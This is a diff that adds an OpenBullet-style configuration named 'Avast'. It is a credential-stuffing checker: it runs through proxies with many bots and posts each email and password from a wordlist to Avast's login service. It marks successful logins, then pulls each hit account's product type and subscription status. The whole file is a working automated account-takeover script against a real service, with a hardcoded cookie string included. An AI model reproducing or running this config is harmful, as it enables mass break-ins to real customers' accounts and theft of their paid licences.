@@ -1,0 +1,80 @@
+[SETTINGS]
+{
+  "Name": "Avast",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-09T18:13:47.2929103+02:00",
+  "AdditionalInfo": "Captures Product and expire",
+  "Author": "Aruz",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://my.avast.com/en-us/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#PARSE_PLAYSESSION PARSE "<COOKIES(PLAY_SESSION)>" LR "" "" -> VAR "TOKENUNSPLIT" 
+
+#PARSE_CSRF_TOKEN PARSE "<TOKENUNSPLIT>" LR "=" "\"" -> VAR "TOKEN" 
+
+#PARSE_SESSIONID PARSE "<COOKIES(mySessionId2)>" LR "" "" -> VAR "MYSESSIONID" 
+
+#POST_LOGIN REQUEST POST "https://id.avast.com/service/single/LoginService/login?target=https%3A%2F%2Fmy.avast.com%2Fen-us%2F" 
+  CONTENT "{\"correlationId\":3,\"operationName\":\"login\",\"payload\":[{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"rememberMe\":false,\"captcha_response\":\"NOTREQUIRED\"},{\"allowAuthenticated\":false,\"extraLoginTicket\":false}],\"securityToken\":\"<TOKEN>\",\"serviceName\":\"LoginService\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "target: https://my.avast.com/en-us/" 
+  HEADER "referer: https://id.avast.com/en-us/?target=https%3A%2F%2Fmy.avast.com%2Fen-us%2F" 
+  HEADER "origin: https://id.avast.com" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"success\":false,\"" 
+  KEYCHAIN Success OR 
+    KEY "\"success\":true,\"" 
+
+#REQUEST_TOKEN REQUEST GET "https://my.avast.com/en-us/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "referer: https://id.avast.com/en-us/?target=https%3A%2F%2Fmy.avast.com%2Fen-us%2F" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#PARSE_SECURITY_TOKEN PARSE "<SOURCE>" LR "securityToken : '" "'" -> VAR "ST" 
+
+#REQUEST_INFO REQUEST POST "https://my.avast.com/en-us/service/single" 
+  CONTENT "{\"serviceName\":\"LicenseService\",\"operationName\":\"getLicenseInfoList\",\"securityToken\":\"<ST>\",\"correlationId\":6,\"payload\":[\"vSJBc0qqqlUnN6QG\"]}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "referer: https://my.avast.com/en-us/" 
+  HEADER "origin: https://my.avast.com" 
+  HEADER "cookie: _ga=GA1.2.2123013385.1527706235; locale2=en-us; _gid=GA1.2.1675586819.1528594875; IDT2=IDTN-125058-2jjo31L9bZivZ9ezz4ba572SGtouUDm4den35444; fbSecThr=true; myLocalIdSession2=\"IDTN-125058-2jjo31L9bZivZ9ezz4ba572SGtouUDm4den35444:2\"; mySessionId2=<MYSESSIONID>; _uetsid=_uet5d1b822d; _gat_UA-58120669-2=1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "productType\":\"" "\",\"purchaseDate\":" -> CAP "productType" 
+
+PARSE "<SOURCE>" LR "subscriptionStatus\":\"" "\"," -> CAP "valid" 
+
